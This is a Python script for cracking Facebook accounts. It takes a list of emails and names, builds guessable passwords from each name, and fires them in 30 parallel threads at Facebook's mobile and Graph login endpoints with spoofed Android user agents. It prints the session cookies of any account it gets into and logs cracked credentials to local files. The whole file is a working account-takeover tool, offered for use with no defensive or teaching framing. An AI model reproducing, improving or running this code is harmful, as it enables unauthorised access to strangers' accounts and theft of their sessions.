import os, sys, time, random, string, uuid, subprocess, json, base64
from concurrent.futures import ThreadPoolExecutor as Th
try: import requests
except:
    os.system('pip install requests')
    import requests
try: from bs4 import BeautifulSoup as bs
except:
    os.system('pip install bs4')
    from bs4 import BeautifulSoup as bs

if sys.version_info[0] == 3:
    pass
else:
    sys.exit('update your python version')


u = '61555408404680'
m = ['12345 Hayami']

a = "\033[1;30m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
w = "\033[00m"
o = "\x1b[38;5;208m"

def cls():
    os.system("clear")

def simple():
    x = input("Put File : ")
    try:
        f = open(x,'r').read().splitlines()
        generate_password(f)
    except FileNotFoundError:
        print("File Not Found")
        time.sleep(2)
        return simple()
        
def leanguage(cookie):
    s = requests.Session()
    cook = {"cookie":cookie}
    req = bs(s.get("https://m.facebook.com/mobile_suggested_locale_selector", cookies=cookie).text, "html.parser")
    data = {"fb_dtsg":req.find("input",{"name":"fb_dtsg"}),"jazoest":req.find("input",{"name":"jazoest"}),"submit":"English (US)"}
    s.post("https://m.facebook.com/mobile_suggested_locale_selector/intl/save_locale/?loc=en_US", data=data, cookies=cookie)
    
class USER_AGENT():
    def HUAWEI():
        J = random.choice(["7","8","9","10","11","12","13"])
        F = random.choice(["AGS-L09", "HUAWEI VNS-L31", "Nexus 6P", "NEM-L51", "ALE-L21", "MRX-AL09", "PRA-LX1"])
        S = random.choice(["HUAWEIVNS-L31; wv", "OPP3.170518.006", "HONORNEM-L51; wv", "HuaweiALE-L21; wv", "HUAWEIAGS-L09; wv", "HONORNEM-L51", "HUAWEIPRA-LX1"])
        I = f"Mozilla/5.0 (Linux; Android {J}; {F} Build/{S}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(111,333))}.0.{str(random.randint(1111,3333))}.{str(random.randint(111,222))} Safari/537.36"
        return (I, F, S, J)

def generate_password(f):
    cls()
    with Th(max_workers=30) as mx:
        for i in f:
            email, namex = i.split("|")
            name = namex.lower()
            fir = name.split(" ")[0]
            try:
                sec = name.split(" ")[2]
            except:
                sec = ""
            pwd = []
            pwd.append("112233")
            pwd.append(name)
            pwd.append(namex)
            pwd.append(fir + "1122")
            pwd.append(fir + "112233")
            pwd.append(fir + "123")
            pwd.append(fir + "1234")
            pwd.append(fir + "12345")
            pwd.append(fir + "2005")
            pwd.append(fir + "2006")
            pwd.append(fir + "2007")
            pwd.append(fir + "2008")
            pwd.append(fir + "2009")
            pwd.append(fir + "112233")
            pwd.append(fir + "1122")
            pwd.append(fir + sec)
            pwd.append(fir + sec + "123")
            pwd.append(fir + sec + "1234")
            pwd.append(fir + sec + "12345")
            pwd.append(name.replace(" ",""))
            mx.submit(Api, email, pwd, len(f))



loop = 0
ok = 0
cp = 0

def Api(email, pwd, total):
    s = requests.Session()
    global loop, ok, cp
    try:
        sys.stdout.write(f"\r{g}[BUG{r}-{g}FB]{w} {loop}|{total}{g}|OK|{ok}|{o}CP|{cp}")
        sys.stdout.flush()
        for pas in pwd:
            headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent":USER_AGENT.HUAWEI()[0] ,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":email,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = s.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).text
            session = json.loads(response)
            if "session_key" in session:
                ok +=1
                items = ";".join(i["name"]+"="+i["value"] for i in session["session_cookies"])
                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookie = f"sb={sb};{items}"
                print(f"\r{w}[OK] {g}{email} {w}|{g} {pas}\r")
                print(f"\r{g}[COOKIE] {w}{cookie}\r")
                open("ok",'a').write(email+" | "+pas+"\n")
            elif "www.facebook.com" in session["error"]["message"]:
                cp +=1
                print(f"\r{o}[cp] {email} | {pas}\r")
                open("cp",'a').write(email+" | "+pas+"\n")
            else:
                continue
        loop +=1
    except requests.exceptions.ConnectionError:
            time.sleep(5)
            
def Login(email, pwd, total):
    s = requests.Session()
    global loop, ok, cp
    try:
        sys.stdout.write(f"\r{g}[BUG{r}-{g}FB]{w} {loop}|{total}{g}|OK|{ok}|{o}CP|{cp}")
        sys.stdout.flush()
        for pas in pwd:
            x = s.get('https://m.facebook.com').text
            cg = bs(x, 'html.parser')
            headers = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-MM,en;q=0.9,my-MM;q=0.8,my;q=0.7,en-GB;q=0.6,en-US;q=0.5',
                'cache-control': 'no-cache',
                'dpr': '2',
                'pragma': 'no-cache',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"{0}"'.format(USER_AGENT.HUAWEI()[1]),
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"{0}.0.0"'.format(USER_AGENT.HUAWEI()[3]),
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': USER_AGENT.HUAWEI()[0],
                'viewport-width': '980',
            }
            data = {
                "lsd":cg.find("input", {"name":"lsd"})["value"],
                "jazoest":cg.find("input", {"name":"jazoest"})["value"],
                "m_ts":cg.find("input", {"name":"m_ts"})["value"],
                "li":cg.find("input", {"name":"li"})["value"],
                "try_number":cg.find("input", {"name":"try_number"})["value"],
                "unrecognized_tries":cg.find("input", {"name":"unrecognized_tries"})["value"],
                "email":email,
                "pass":pas,
                "bi_xrwh":cg.find("input", {"name":"bi_xrwh"})["value"],
                "_fb_noscript":cg.find("input", {"name":"_fb_noscript"})["value"],
                "login":"submit"
            }
            pos = s.post("https://m.facebook.com/login/device-based/regular/login/", data=data, headers=headers, allow_redirects=True)
            if "c_user" in s.cookies.get_dict():
                ok +=1
                cookie = ";".join([key + "=" + value for key,value in s.cookies.get_dict().items()])
                print(f"\r{w}[OK] {g}{email} {w}|{g} {pas}\r")
                print(f"\r{g}[COOKIE] {w}{cookie}\r")
                open("ok",'a').write(email+" | "+pas+"\n")
                break
            elif "checkpoint" in s.cookies.get_dict():
                cp +=1
                print(f"\r{o}[cp] {email} | {pas}\r")
                open("cp",'a').write(email+" | "+pas+"\n")
                break
            else:
                continue
        loop +=1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        
def linex():
    print(f"{w}"*46)

class main():
    def __init__(self):
        cls()
        linex()
        print("1# FILE_crack")
        linex()
        self.call()
    
    def call(self):
        x = input("Put Feature : ")
        if x == "1" or x == "1#":
            cls()
            simple()

if __name__ == "__main__":
    main()
    